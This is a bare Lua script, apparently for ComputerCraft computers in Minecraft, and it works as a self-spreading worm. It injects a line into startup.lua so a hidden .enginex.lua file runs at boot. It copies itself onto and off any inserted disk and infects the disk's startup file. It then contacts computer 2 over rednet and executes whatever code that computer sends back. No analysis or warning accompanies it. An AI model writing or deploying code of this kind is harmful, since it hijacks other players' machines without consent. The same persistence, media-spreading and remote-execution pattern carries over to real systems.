if os.getComputerID() == 0 or os.getComputerID() == 2 then
    return
end
local drive = peripheral.find("drive")
local function injectStartup(path)
    local f = fs.open(path, "r")
    local content = f and f.readAll() or ""
    if f then f.close() end
    
    local inject = "local drive = peripheral.find('drive'); if fs.exists('.enginex.lua') then shell.run('.enginex.lua') else shell.run(drive.getMountPath() .. '/.enginex.lua') end"
    
    if not content:find(inject, 1, true) then
        f = fs.open(path, "w")
        if content ~= "" and not content:match("\n$") then
            content = content .. "\n"
        end
        f.write(content .. inject .. "\n")
        f.close()
        return true
    end
    return false
end

injectStartup("startup.lua")
if drive and drive.isDiskPresent() then
    if fs.exists("/.enginex.lua") and not fs.exists(drive.getMountPath() .. "/.enginex.lua") then
        fs.copy("/.enginex.lua", drive.getMountPath() .. "/.enginex.lua")
    elseif fs.exists(drive.getMountPath() .. "/.enginex.lua") and not fs.exists("/.enginex.lua") then
        fs.copy(drive.getMountPath() .. "/.enginex.lua", "/.enginex.lua")
    end
	injectStartup(drive.getMountPath() .. "/startup.lua")
end

local mdm = peripheral.find("modem", rednet.open)

rednet.send(2, "got")
local id2, answ = rednet.receive(nil, 0.1)
if id2 == 2 then
    load(answ,nil,"t",_ENV)()
end
rednet.close()